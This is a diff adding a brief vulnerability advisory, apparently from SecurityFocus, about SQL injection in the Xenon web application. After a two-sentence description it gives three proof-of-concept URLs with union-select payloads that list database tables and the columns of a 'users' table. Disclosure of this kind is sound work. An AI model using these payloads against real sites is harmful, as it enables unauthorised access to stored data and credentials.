@@ -1,0 +1,11 @@
+source: http://www.securityfocus.com/bid/50141/info
+
+Xenon is prone to multiple SQL-injection vulnerabilities because the application fails to properly sanitize user-supplied input before using it in an SQL query.
+
+A successful exploit may allow an attacker to compromise the application, access or modify data, or exploit vulnerabilities in the underlying database.
+
+http://www.example.com/news_detail.php?id=-9+union+select+0,1,2,3,group_concat%28table_name%29,5+from+information_schema.tables
+
+http://www.example.com/viewstory.php?id=-8+and+1=1+union+select+0,1,2,group_concat%28column_name%29,4+from+information_schema.columns+where+table_name=0x7573657273
+
+http://www.example.com/event.php?id=-153+union+select+0,1,2,3,4,5,6,7,8,group_concat%28table_name%29,10,11,12,13,14,15,16,17,18,19,20,21,22,23+from+information_schema.tables
